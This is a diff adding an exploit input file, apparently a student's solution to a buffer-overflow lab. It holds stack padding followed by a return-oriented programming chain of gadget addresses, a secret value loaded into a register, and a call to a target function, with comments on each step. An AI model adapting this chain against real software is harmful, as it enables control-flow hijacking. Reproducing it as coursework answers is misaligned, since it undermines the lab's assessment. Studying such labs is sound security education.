@@ -1,0 +1,10 @@
+/* buffer zeros, to get above stack frame for getbuf */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* address of setval_336-- we pop the secret code off the stack (below) and put it into eax  */
+07 18 40 00 00 00 00 00 
+/* my secret code, popped off stack and put into eax */
+0e 66 21 5d 00 00 00 00
+/* address of getval_275,  where we move eax into rdi */
+ 15 18 40 00 00 00 00 00 
+/* finally, we call glow */
+94 16 40 00 00 00 00 00 00
